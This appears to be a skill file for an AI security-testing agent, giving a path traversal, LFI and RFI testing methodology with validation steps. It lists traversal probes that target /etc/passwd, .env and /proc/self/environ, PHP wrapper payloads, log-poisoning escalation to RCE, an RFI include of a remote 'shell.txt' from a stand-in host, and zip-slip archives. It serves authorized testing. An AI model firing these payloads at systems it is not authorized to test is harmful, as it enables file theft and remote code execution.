---
name: path-traversal
description: Path traversal / LFI / RFI testing (CWE-22/CWE-98, WSTG-ATHZ-01/INPV-11/12). Use on any param that names a file, template, page, or path.
allowed-tools: Read, Grep, Glob, Bash
---

# Path Traversal / LFI / RFI Skill (CWE-22)

Reading arbitrary files (LFI) or including remote/local code (RFI) via a
file/path parameter. Escalates to source/secret disclosure, log-poisoning RCE,
or SSRF. Severity follows what you can actually read or execute.

## Prerequisites
- A parameter referencing a path: `file`, `path`, `page`, `template`, `lang`,
  `download`, `doc`, `include`, image/report generators, ZIP entry names.

## Methodology

### Step 1: Traversal probes
`../../../../etc/passwd`, `....//....//`, encoded `%2e%2e%2f`, double-encoded
`%252e%252e%252f`, UTF-8 overlong, leading `/`, null `%00`, and Windows
`..\..\..\windows\win.ini`.

### Step 2: Wrappers / known files (LFI)
PHP wrappers `php://filter/convert.base64-encode/resource=index.php`,
`data://`, `expect://`; read `/etc/passwd`, app config, `.env`, `/proc/self/environ`.

### Step 3: Escalate
- Source disclosure → secrets → wider compromise.
- Log/`/proc/self/environ` poisoning → LFI-to-RCE.
- RFI: `http://collaborator/shell.txt` if remote includes are allowed.

### Step 4: Zip-slip / archive extraction
For import/extract features, craft an archive with `../` entry names that escape
the extraction dir.

## Payloads / wordlists
LFI/traversal list; `specter/wordlists/`.

## Validate (negative control)
- **Attack:** return actual out-of-tree file content (e.g. `/etc/passwd` lines or
  base64 of a source file) — content the app would never legitimately serve.
- **Negative control:** the same parameter with a normal value returns the expected
  in-tree file, and a nonsense path 404s. That isolates traversal as the cause.

## Evidence to capture
Request + the leaked file content (redact secrets in the report, keep raw in evidence).
For RFI/RCE, the OOB callback or command output.

## False-positive traps
- Reflected error mentioning a path but no file content returned.
- A sandbox/chroot that limits reads to a harmless dir.
- WAF returns a generic page you mistake for content.

## Validate & Promote

Findings from this skill are born `theoretical` (see the repo-root `CLAUDE.md`). Promote via `scripts/validate-finding.sh` only after retrieving genuine out-of-tree content.

```bash
bash scripts/validate-finding.sh --project-dir "$PROJECT_DIR" --agent specter \
  --id SPE-NNN --state confirmed --method manual-repro \
  --negative-control "file=../../../../etc/passwd returns root:x:0:0 lines; file=valid.pdf returns the PDF; file=nope 404s" --by specter
```
